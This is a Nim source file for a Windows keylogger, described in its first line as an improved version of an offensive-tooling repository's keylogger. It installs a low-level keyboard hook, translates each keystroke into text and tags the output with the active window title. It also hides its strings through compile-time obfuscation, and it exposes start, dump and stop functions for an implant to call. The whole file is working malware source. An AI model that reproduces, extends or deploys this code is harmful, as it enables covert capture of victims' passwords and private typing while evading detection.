# imporved version of https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/keylogger_bin.nim

import winim
import tables
import strutils
import nimprotect
import threadpool

type
    Keys = enum
        Modifiers = -65536
        None = 0
        LButton = 1
        RButton = 2
        Cancel = 3
        MButton = 4
        XButton1 = 5
        XButton2 = 6
        Back = 8
        Tab = 9
        LineFeed = 10
        Clear = 12
        #Return = 13
        Enter = 13
        ShiftKey = 16
        ControlKey = 17
        Menu = 18
        Pause = 19
        Capital = 20
        #CapsLock = 20
        KanaMode = 21
        #HanguelMode = 21
        #HangulMode = 21
        JunjaMode = 23
        FinalMode = 24
        #HanjaMode = 25
        KanjiMode = 25
        Escape = 27
        IMEConvert = 28
        IMENonconvert = 29
        IMEAccept = 30
        #IMEAceept = 30
        IMEModeChange = 31
        Space = 32
        #Prior = 33
        PageUp = 33
        #Next = 34
        PageDown = 34
        End = 35
        Home = 36
        Left = 37
        Up = 38
        Right = 39
        Down = 40
        Select = 41
        Print = 42
        Execute = 43
        #Snapshot = 44
        PrintScreen = 44
        Insert = 45
        Delete = 46
        Help = 47
        D0 = 48
        D1 = 49
        D2 = 50
        D3 = 51
        D4 = 52
        D5 = 53
        D6 = 54
        D7 = 55
        D8 = 56
        D9 = 57
        A = 65
        B = 66
        C = 67
        D = 68
        E = 69
        F = 70
        G = 71
        H = 72
        I = 73
        J = 74
        K = 75
        L = 76
        M = 77
        N = 78
        O = 79
        P = 80
        Q = 81
        R = 82
        S = 83
        T = 84
        U = 85
        V = 86
        W = 87
        X = 88
        Y = 89
        Z = 90
        LWin = 91
        RWin = 92
        Apps = 93
        Sleep = 95
        NumPad0 = 96
        NumPad1 = 97
        NumPad2 = 98
        NumPad3 = 99
        NumPad4 = 100
        NumPad5 = 101
        NumPad6 = 102
        NumPad7 = 103
        NumPad8 = 104
        NumPad9 = 105
        Multiply = 106
        Add = 107
        Separator = 108
        Subtract = 109
        Decimal = 110
        Divide = 111
        F1 = 112
        F2 = 113
        F3 = 114
        F4 = 115
        F5 = 116
        F6 = 117
        F7 = 118
        F8 = 119
        F9 = 120
        F10 = 121
        F11 = 122
        F12 = 123
        F13 = 124
        F14 = 125
        F15 = 126
        F16 = 127
        F17 = 128
        F18 = 129
        F19 = 130
        F20 = 131
        F21 = 132
        F22 = 133
        F23 = 134
        F24 = 135
        NumLock = 144
        Scroll = 145
        LShiftKey = 160
        RShiftKey = 161
        LControlKey = 162
        RControlKey = 163
        LMenu = 164
        RMenu = 165
        BrowserBack = 166
        BrowserForward = 167
        BrowserRefresh = 168
        BrowserStop = 169
        BrowserSearch = 170
        BrowserFavorites = 171
        BrowserHome = 172
        VolumeMute = 173
        VolumeDown = 174
        VolumeUp = 175
        MediaNextTrack = 176
        MediaPreviousTrack = 177
        MediaStop = 178
        MediaPlayPause = 179
        LaunchMail = 180
        SelectMedia = 181
        LaunchApplication1 = 182
        LaunchApplication2 = 183
        OemSemicolon = 186
        #Oem1 = 186
        Oemplus = 187
        Oemcomma = 188
        OemMinus = 189
        OemPeriod = 190
        OemQuestion = 191
        #Oem2 = 191
        Oemtilde = 192
        #Oem3 = 192
        OemOpenBrackets = 219
        #Oem4 = 219
        OemPipe = 220
        #Oem5 = 220
        OemCloseBrackets = 221
        #Oem6 = 221
        OemQuotes = 222
        #Oem7 = 222
        Oem8 = 223
        OemBackslash = 226
        #Oem102 = 226
        ProcessKey = 229
        Packet = 231
        Attn = 246
        Crsel = 247
        Exsel = 248
        EraseEof = 249
        Play = 250
        Zoom = 251
        NoName = 252
        Pa1 = 253
        OemClear = 254
        KeyCode = 65535
        Shift = 65536
        Control = 131072
        Alt = 262144

const   
    KeyDict = {
        Keys.Attn: protectString("[Attn]"),
        Keys.Clear: protectString("[Clear]"),
        Keys.Down: protectString("[Down]"),
        Keys.Up: protectString("[Up]"),
        Keys.Left: protectString("[Left]"),
        Keys.Right: protectString("[Right]"),
        Keys.Escape: protectString("[Escape]"),
        Keys.Tab: protectString("[Tab]"),
        Keys.LWin: protectString("[LeftWin]"),
        Keys.RWin: protectString("[RightWin]"),
        Keys.PrintScreen: protectString("[PrintScreen]"),
        Keys.D0: protectString("0"),
        Keys.D1: protectString("1"),
        Keys.D2: protectString("2"),
        Keys.D3: protectString("3"),
        Keys.D4: protectString("4"),
        Keys.D5: protectString("5"),
        Keys.D6: protectString("6"),
        Keys.D7: protectString("7"),
        Keys.D8: protectString("8"),
        Keys.D9: protectString("9"),
        Keys.Space: protectString(" "),
        Keys.NumLock: protectString("[NumLock]"),
        Keys.Alt: protectString("[Alt]"),
        Keys.LControlKey: protectString("[LeftControl]"),
        Keys.RControlKey: protectString("[RightControl]"),
        #Keys.CapsLock: protectString("[CapsLock]"),
        Keys.Delete: protectString("[Delete]"),
        Keys.Enter: protectString("[Enter]"),
        Keys.Divide: protectString("/"),
        Keys.Multiply: protectString("*"),
        Keys.Add: protectString("+"),
        Keys.Subtract: protectString("-"),
        Keys.PageDown: protectString("[PageDown]"),
        Keys.PageUp: protectString("[PageUp]"),
        Keys.End: protectString("[End]"),
        Keys.Insert: protectString("[Insert]"),
        Keys.Decimal: protectString("."),
        Keys.OemSemicolon: protectString(";"),
        Keys.Oemtilde: protectString("`"),
        Keys.Oemplus: protectString("="),
        Keys.OemMinus: protectString("-"),
        Keys.Oemcomma: protectString(","),
        Keys.OemPeriod: protectString("."),
        Keys.OemPipe: protectString("\\"),
        Keys.OemQuotes: protectString("\""),
        Keys.OemCloseBrackets: protectString("]"),
        Keys.OemOpenBrackets: protectString("["),
        Keys.Home: protectString("[Home]"),
        Keys.Back: protectString("[Backspace]"),
        Keys.NumPad0: protectString("0"),
        Keys.NumPad1: protectString("1"),
        Keys.NumPad2: protectString("2"),
        Keys.NumPad3: protectString("3"),
        Keys.NumPad4: protectString("4"),
        Keys.NumPad5: protectString("5"),
        Keys.NumPad6: protectString("6"),
        Keys.NumPad7: protectString("7"),
        Keys.NumPad8: protectString("8"),
        Keys.NumPad9: protectString("9"),
    }.toTable()

    KeyDictShift = {
        Keys.D0: protectString(")"),
        Keys.D1: protectString("!"),
        Keys.D2: protectString("@"),
        Keys.D3: protectString("#"),
        Keys.D4: protectString("$"),
        Keys.D5: protectString("%"),
        Keys.D6: protectString("^"),
        Keys.D7: protectString("&"),
        Keys.D8: protectString("*"),
        Keys.D9: protectString("("),
        Keys.OemSemicolon: protectString(":"),
        Keys.Oemtilde: protectString("~"), 
        Keys.Oemplus: protectString("+"),
        Keys.OemMinus: protectString("_"),
        Keys.Oemcomma: protectString("<"),
        Keys.OemPeriod: protectString(">"), 
        Keys.OemPipe: protectString("|"),
        Keys.OemQuotes: protectString("'"),
        Keys.OemCloseBrackets: protectString(""),
        Keys.OemOpenBrackets: protectString(""),
    }.toTable()

var channel_klout: Channel[string]
var channel_klstop: Channel[int]
var currentActiveWindow : LPWSTR 

proc GetActiveWindowTitle(): LPWSTR {.gcsafe.} = 
    var capacity: int32 = 256
    var builder: LPWSTR = newString(capacity)
    var wHandle = GetForegroundWindow()
    defer: CloseHandle(wHandle)
    GetWindowText(wHandle, builder, capacity)
    return builder


proc hook_callback(nCode: int32, wParam: WPARAM, lParam: LPARAM): LRESULT {.stdcall, gcsafe.} =  

    if nCode >= 0 and wParam == WM_KEYDOWN:
        var keypressed: string
        var kbdstruct: PKBDLLHOOKSTRUCT = cast[ptr KBDLLHOOKSTRUCT](lparam)
        var shifted: bool = (GetKeyState(160) < 0) or (GetKeyState(161) < 0)
        var keycode: Keys = cast[Keys](kbdstruct.vkCode)

        if shifted and (keycode in KeyDictShift):
            keypressed = KeyDictShift.getOrDefault(keycode)
        elif keycode in KeyDict:
            keypressed = KeyDict.getOrDefault(keycode)
        else:
            var capped: bool = (GetKeyState(20) != 0)
            if (capped and shifted) or not (capped or shifted):
                keypressed = $toLowerAscii(chr(ord(keycode)))
            else:
                keypressed = $toUpperAscii(chr(ord(keycode)))
        
        var newActiveWindow = GetActiveWindowTitle()

        if ($newActiveWindow).replace("*", "") != ($currentActiveWindow).replace("*", ""):
            currentActiveWindow = newActiveWindow
            channel_klout.send(protectString("\n-- [Window: '") & $currentActiveWindow & protectString("'] --\n"))
        # Send key pressed to queue
        channel_klout.send(keypressed)

    return CallNextHookEx(0, nCode, wParam, lParam)


proc keylog() {.gcsafe.} =
    var hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC) hook_callback, 0,  0)
    if bool(hook):
        try:
            var msg: MSG
            while true:
                var tried = channel_klstop.tryRecv()
                if tried.dataAvailable:
                    break
                GetMessage(msg.addr, 0, 0, 0)

        finally:
            UnhookWindowsHookEx(hook)


proc keylog_start*() =
    channel_klout.open()
    channel_klstop.open()
    spawn keylog()


proc keylog_dump*(): string = 
    var keylog_out = ""
    while true:
        var tried = channel_klout.tryRecv()
        if tried.dataAvailable:
            keylog_out &= tried.msg
        else:
            break
    return keylog_out


proc keylog_stop*(): string =
    var keylog_out = keylog_dump()
    channel_klstop.send(1)
    return keylog_out
